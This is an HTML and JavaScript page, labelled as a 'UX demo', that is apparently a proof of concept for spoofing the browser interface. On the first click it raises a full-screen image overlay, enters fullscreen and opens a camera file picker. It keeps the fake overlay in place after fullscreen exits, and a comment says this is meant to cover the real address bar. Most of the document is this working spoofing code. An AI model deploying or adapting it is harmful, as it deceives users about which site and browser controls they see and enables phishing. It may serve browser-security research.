<!DOCTYPE html>
<html lang="en">
<head>
  <title>Security UI Spoof (UX Demo)</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #111;
      color: #fff;
      font-family: sans-serif;
      height: 200vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    #spoof {
      position: fixed;
      top: 100vh; /* awalnya turun */
      left: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: block;
      z-index: 9999;
      pointer-events: none;
      transition: top 0.5s ease; /* animasi naik */
    }

    input[type=file] {
      display: none;
    }
  </style>
</head>
<body>

<img id="spoof" src="spof1.png" alt="UI overlay">
<div id="content">
  <h1>Tap anywhere to start demo</h1>
</div>

<input id="filePicker" type="file" accept="image/*" capture="environment">

<script>
const filePicker = document.getElementById('filePicker');
const spoof = document.getElementById('spoof');

document.addEventListener('click', async () => {
  // 1️⃣ Show overlay segera
  spoof.style.top = '0'; // overlay naik
  document.getElementById('content').style.display = 'none';

  // 2️⃣ Enter fullscreen
  if (document.documentElement.requestFullscreen) {
    try {
      await document.documentElement.requestFullscreen();
    } catch(e) {}
  }

  // 3️⃣ Trigger file picker langsung dari click user
  filePicker.click();
}, { once: true });

// 4️⃣ Deteksi keluar fullscreen → tetap tampil di atas UI
document.addEventListener('fullscreenchange', () => {
  if (!document.fullscreenElement) {
    // keluar fullscreen, pastikan overlay tetap menutupi omnibar
    spoof.style.top = '0';
  }
});

filePicker.addEventListener('change', (e) => {
  if (filePicker.files.length > 0) {
    console.log('File selected:', filePicker.files[0].name);
    alert('File selected: ' + filePicker.files[0].name);
  } else {
    console.log('No file selected');
  }
});
</script>

</body>
</html>
